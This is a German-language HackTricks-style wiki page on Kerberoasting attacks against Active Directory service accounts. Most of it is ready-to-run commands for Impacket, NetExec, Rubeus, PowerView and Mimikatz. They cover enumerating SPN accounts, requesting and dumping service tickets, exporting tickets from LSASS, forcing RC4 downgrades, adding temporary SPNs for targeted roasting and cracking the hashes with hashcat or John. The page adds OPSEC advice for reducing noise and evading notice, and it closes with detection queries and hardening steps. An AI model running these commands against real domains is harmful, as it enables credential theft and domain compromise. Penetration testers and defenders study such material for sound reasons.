# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting konzentriert sich auf das Beschaffen von TGS-Tickets, speziell auf solche, die zu Diensten gehören, die unter Benutzerkonten in Active Directory (AD) laufen (ausgenommen Computeraccounts). Die Verschlüsselung dieser Tickets verwendet Schlüssel, die aus Benutzerpasswörtern abgeleitet werden, was ein Offline-Cracking der Zugangsdaten ermöglicht. Die Verwendung eines Benutzerkontos als Service erkennt man an einem nicht-leeren ServicePrincipalName (SPN)-Attribut.

Jeder authentifizierte Domänenbenutzer kann TGS-Tickets anfordern, es sind also keine besonderen Berechtigungen erforderlich.

### Wichtige Punkte

- Zielt auf TGS-Tickets für Dienste ab, die unter Benutzerkonten laufen (d. h. Konten mit gesetztem SPN; nicht Computeraccounts).
- Tickets sind mit einem Schlüssel verschlüsselt, der aus dem Passwort des Servicekontos abgeleitet ist, und können offline geknackt werden.
- Keine erhöhten Berechtigungen nötig; jedes authentifizierte Konto kann TGS-Tickets anfordern.

> [!WARNING]
> Die meisten öffentlichen Tools bevorzugen das Anfordern von RC4-HMAC (etype 23)-Service-Tickets, weil diese schneller zu knacken sind als AES. RC4-TGS-Hashes beginnen mit `$krb5tgs$23$*`, AES128 mit `$krb5tgs$17$*` und AES256 mit `$krb5tgs$18$*`. Viele Umgebungen wechseln jedoch zu AES-only. Gehe nicht davon aus, dass nur RC4 relevant ist.
> Vermeide außerdem „spray-and-pray“ Roasting. Rubeus’ default kerberoast kann alle SPNs abfragen und Tickets anfordern und ist dadurch laut. Zuerst interessante Principals enumerieren und gezielt angreifen.

### Service account secrets & Kerberos crypto cost

Viele Dienste laufen noch immer unter Benutzerkonten mit manuell verwalteten Passwörtern. Der KDC verschlüsselt Service-Tickets mit Schlüsseln, die aus diesen Passwörtern abgeleitet sind, und gibt den Ciphertext an jeden authentifizierten Principal aus — daher erlaubt kerberoasting unbegrenzte Offline-Versuche ohne Lockouts oder DC-Telemetrie. Der Verschlüsselungsmodus bestimmt das Cracking-Budget:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 mit 4.096 Iterationen und einem pro-Principal Salt, generiert aus der Domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blockiert Rainbow-Tables, erlaubt aber trotzdem schnelles Knacken kurzer Passwörter. |
| RC4 + NT hash | Single MD4 des Passworts (unsalted NT hash); Kerberos mischt nur einen 8-Byte-Confounder pro Ticket ein | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× schneller als AES; Angreifer erzwingen RC4, wann immer `msDS-SupportedEncryptionTypes` es erlaubt. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Der RC4-Confounder randomisiert lediglich den Keystream; er erhöht nicht die Arbeit pro Guess. Sofern Service-Konten nicht auf zufällige Geheimnisse setzen (gMSA/dMSA, machine accounts oder vault-managed strings), ist die Kompromittierungsgeschwindigkeit rein von der GPU-Ressource abhängig. Das Erzwingen von AES-only etypes beseitigt den Milliarden-Guesses-pro-Sekunde-Nachteil, aber schwache menschliche Passwörter fallen weiterhin PBKDF2 zum Opfer.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Multifunktionale Tools, einschließlich kerberoast checks:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable Benutzer auflisten
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technik 1: TGS anfordern und dump aus dem Arbeitsspeicher
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technik 2: Automatisierte Tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Eine TGS-Anforderung erzeugt Windows Security Event 4769 (Ein Kerberos-Service-Ticket wurde angefordert).

### OPSEC und AES-only-Umgebungen

- Fordere RC4 absichtlich für Konten ohne AES an:
- Rubeus: `/rc4opsec` verwendet tgtdeleg, um Konten ohne AES aufzulisten und RC4-Service-Tickets anzufordern.
- Rubeus: `/tgtdeleg` mit kerberoast löst ebenfalls RC4-Anfragen aus, wo möglich.
- Roast AES-only-Konten, anstatt stillschweigend zu fehlschlagen:
- Rubeus: `/aes` listet Konten mit aktiviertem AES auf und fordert AES-Service-Tickets an (etype 17/18).
- Wenn du bereits ein TGT besitzt (PTT oder aus einer .kirbi), kannst du `/ticket:<blob|path>` mit `/spn:<SPN>` oder `/spns:<file>` verwenden und LDAP überspringen.
- Zielauswahl, Drosselung und weniger Lärm:
- Verwende `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` und `/jitter:<1-100>`.
- Filtere nach wahrscheinlich schwachen Passwörtern mit `/pwdsetbefore:<MM-dd-yyyy>` (ältere Passwörter) oder ziele auf privilegierte OUs mit `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenz / Missbrauch

Wenn Sie ein Konto kontrollieren oder ändern können, können Sie es kerberoastable machen, indem Sie einen SPN hinzufügen:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Einen Account herabstufen, um RC4 für einfacheres cracking zu aktivieren (erfordert Schreibrechte auf das Zielobjekt):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Gezieltes Kerberoast via GenericWrite/GenericAll über einen Benutzer (temporärer SPN)

Wenn BloodHound anzeigt, dass Sie Kontrolle über ein Benutzerobjekt haben (z. B. GenericWrite/GenericAll), können Sie zuverlässig einen “targeted-roast” gegen diesen spezifischen Benutzer durchführen, selbst wenn er aktuell keine SPNs hat:

- Füge dem kontrollierten Benutzer einen temporären SPN hinzu, um ihn roastbar zu machen.
- Fordere eine mit RC4 (etype 23) verschlüsselte TGS-REP für diesen SPN an, um das Cracking zu begünstigen.
- Cracke den `$krb5tgs$23$...`-Hash mit hashcat.
- Bereinige den SPN, um Spuren zu reduzieren.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux-Einzeiler (targetedKerberoast.py automatisiert add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack die Ausgabe mit hashcat autodetect (mode 13100 für `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Erkennungsnotizen: Das Hinzufügen/Entfernen von SPNs führt zu Änderungen im Verzeichnis (Event ID 5136/4738 beim Zielbenutzer) und die TGS-Anfrage erzeugt Event ID 4769. Erwägen Sie Drosselung und zügiges Aufräumen.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

Im September 2022 zeigte Charlie Clark, dass, wenn ein Principal keine Pre-Authentifizierung verlangt, es möglich ist, ein Service-Ticket mittels einer manipulierten KRB_AS_REQ zu erhalten, indem das sname im Request-Body verändert wird, wodurch effektiv ein Service-Ticket statt eines TGT ausgestellt wird. Dies ähnelt AS-REP roasting und erfordert keine gültigen Domain-Anmeldeinformationen.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Sie müssen eine Liste von Benutzern bereitstellen, da Sie ohne gültige Anmeldeinformationen LDAP mit dieser Technik nicht abfragen können.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwandt

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### Detection

Kerberoasting kann unauffällig sein. Suchen Sie nach Event ID 4769 von DCs und wenden Sie Filter an, um Rauschen zu reduzieren:

- Schließen Sie den Service-Namen `krbtgt` und Service-Namen aus, die mit `$` enden (Computeraccounts) aus.
- Schließen Sie Anfragen von Maschinenkonten (`*$$@*`) aus.
- Nur erfolgreiche Anfragen (Fehlercode `0x0`).
- Verfolgen Sie Verschlüsselungstypen: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Alarmieren Sie nicht nur bei `0x17`.

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Weitere Ideen:

- Erfasse die normale SPN-Nutzung pro Host/Benutzer; alarmiere bei großen Anstiegen von unterschiedlichen SPN-Anfragen durch einen einzelnen principal.
- Kennzeichne ungewöhnliche RC4-Nutzung in AES-gesicherten Domänen.

### Gegenmaßnahmen / Härtung

- Verwenden Sie gMSA/dMSA oder Maschinenkonten für Dienste. Verwaltete Konten haben 120+ Zeichen lange zufällige Passwörter und rotieren automatisch, wodurch Offline-Cracking unpraktisch wird.
- Erzwingen Sie AES bei Service-Konten, indem Sie `msDS-SupportedEncryptionTypes` auf AES-only (decimal 24 / hex 0x18) setzen und anschließend das Passwort rotieren, damit AES-Keys abgeleitet werden.
- Deaktivieren Sie, wo möglich, RC4 in Ihrer Umgebung und überwachen Sie auf versuchte RC4-Nutzung. Auf DCs können Sie den Registry-Wert `DefaultDomainSupportedEncTypes` verwenden, um die Defaults für Konten ohne gesetztes `msDS-SupportedEncryptionTypes` zu steuern. Gründlich testen.
- Entfernen Sie unnötige SPNs aus Benutzerkonten.
- Verwenden Sie lange, zufällige Service-Account-Passwörter (25+ chars), falls verwaltete Konten nicht möglich sind; sperren Sie gängige Passwörter und führen Sie regelmäßige Audits durch.

## Referenzen

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
